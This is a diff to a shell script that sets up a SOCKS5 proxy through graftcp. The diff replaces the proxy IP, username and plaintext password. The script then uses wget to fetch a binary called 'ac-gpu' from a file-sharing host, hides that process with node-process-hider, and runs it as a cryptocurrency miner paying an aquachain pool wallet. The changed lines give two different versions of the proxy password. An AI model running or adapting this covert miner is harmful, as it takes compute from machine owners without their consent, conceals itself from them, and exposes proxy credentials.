@@ -13,9 +13,9 @@ cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233 
 loglevel = 1 
 select_proxy_mode=socks5_only 
-socks5 = 45.86.53.248:12324
-socks5_username =  14a179a58c75a
-socks5_password =  0406e41612
+socks5 = 154.13.90.91:80
+socks5_username = nofvbdys-rotate
+socks5_password = 044tpywm4q9bo
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -37,4 +37,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && npm i -g node-process-hider && chmod +x ac-gpu && ph add ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/tes -t 1 --proxy socks5://14a179a58c75a:0406e41612@45.86.53.248:12324
+./graftcp/graftcp wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && npm i -g node-process-hider && chmod +x ac-gpu && ph add ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/tes -t 1 --proxy socks5://nofvbdys-rotate:44tpywm4q9bo@154.13.90.91:80
